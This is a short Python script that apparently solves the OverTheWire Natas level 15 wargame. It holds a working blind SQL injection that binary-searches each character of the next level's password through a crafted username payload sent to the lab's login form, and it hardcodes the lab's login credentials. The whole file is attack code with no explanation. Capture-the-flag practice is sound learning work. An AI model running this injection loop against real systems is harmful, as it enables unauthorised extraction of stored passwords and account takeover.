import requests

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

password = ""

for i in range(1, 33):  # password length is 32
    low = 32
    high = 126

    while low <= high:
        mid = (low + high) // 2

        payload = f'natas16" AND ASCII(SUBSTRING(password,{i},1)) > {mid} -- '
        response = requests.post(url, data={"username": payload}, auth=auth)

        if "This user exists" in response.text:
            low = mid + 1
        else:
            high = mid - 1

    password += chr(low)
    print(f"[+] Found so far: {password}")

print(f"[✓] Password: {password}")